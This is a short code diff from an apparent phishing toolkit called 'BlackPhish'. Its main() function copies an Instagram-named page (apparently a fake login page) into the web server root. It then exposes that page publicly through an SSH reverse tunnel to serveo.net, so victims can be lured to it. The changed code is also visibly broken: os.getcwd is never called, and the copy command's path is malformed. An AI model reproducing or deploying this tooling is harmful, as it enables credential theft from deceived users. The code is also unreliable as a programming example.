@@ -7,13 +7,14 @@ except ImportError():
     exit(1)
 
 
-def install(): # Host webpage #
-    os.system('cp /usr/share/Blackphish/insta /var/www/html/')
-def serveo_forward(): # Port forward to serveo#
-    os.system('nohup ssh -R inc0gnit0:80:localhost:80 serveo.net')
-    #subprocess.Popen(["rm","-r","some.file"])
 
 def main():  # Main script #
+    pwd = os.getcwd
+    def install(): # Host webpage #
+        os.system('cp ' + pwd + '/' + ' insta' '/var/www/html/')
+    def serveo_forward(): # Port forward to serveo#
+        os.system('nohup ssh -R inc0gnit0:80:localhost:80 serveo.net')
+        #subprocess.Popen(["rm","-r","some.file"])
     choice = input("[BlackPhish] -> ") # Get user input #
     if choice == "1":
         print('[*] Copying Files')
